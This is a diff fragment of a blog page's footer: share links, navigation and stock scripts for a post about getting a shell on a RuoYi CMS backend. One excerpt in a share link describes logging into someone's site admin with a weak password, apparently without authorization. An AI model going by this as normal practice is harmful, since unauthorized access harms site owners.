+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/&title=记一次若依cms后台getshell"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/&title=记一次若依cms后台getshell"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/&title=记一次若依cms后台getshell"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/&title=记一次若依cms后台getshell"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/&name=记一次若依cms后台getshell&description=&lt;p&gt;大晚上看了一个站，弱口令进了后台，是若依的二开。网上找了一下官方给的历史漏洞&lt;a href=&#34;https://doc.ruoyi.vip/ruoyi/document/kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E&#34;&gt;https://doc.ruoyi.vip/ruoyi/document/kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E&lt;/a&gt;，很不错全部修了，准备洗洗睡了。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/&t=记一次若依cms后台getshell"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    Bkfish
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
